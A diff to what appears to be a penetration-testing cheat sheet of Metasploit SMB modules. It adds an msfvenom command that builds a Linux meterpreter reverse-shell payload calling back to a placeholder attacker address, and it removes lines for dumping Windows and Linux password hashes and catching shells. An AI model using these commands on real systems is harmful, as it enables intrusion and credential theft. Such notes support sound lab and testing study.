@@ -1,4 +1,4 @@
-# Metasploit
+# SMB Enumeration and Exploitation
 
 ### Handy Metasploit modules
 
@@ -7,9 +7,8 @@
 | smb_login     | SMB      |    Brute-force SMB credentials. |
 | smb_version   | SMB      |    Scan for SMB version.        |
 | smb_enumshares| SMB      |    Enumerates SMB shares.       |
-| post/windows/gather/smart_hashdump  | Windows(any)    | ```run post/windows/gather/smart_hashdump``` - Use this when in meterpreter shell and want to search for Windows hashes.        | 
-| post/linux/gather/hashdump   | Linux(any)    | ```run post/linux/gather/hashdump``` - Use this when in meterpreter shell and want to search for Linux hashes.        |
-| exploit/multi/handler| Any      |    Use this to catch shell.       |
+
+```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf``` - Linux.
 
 <details>
 <summary>msfvenom</summary>
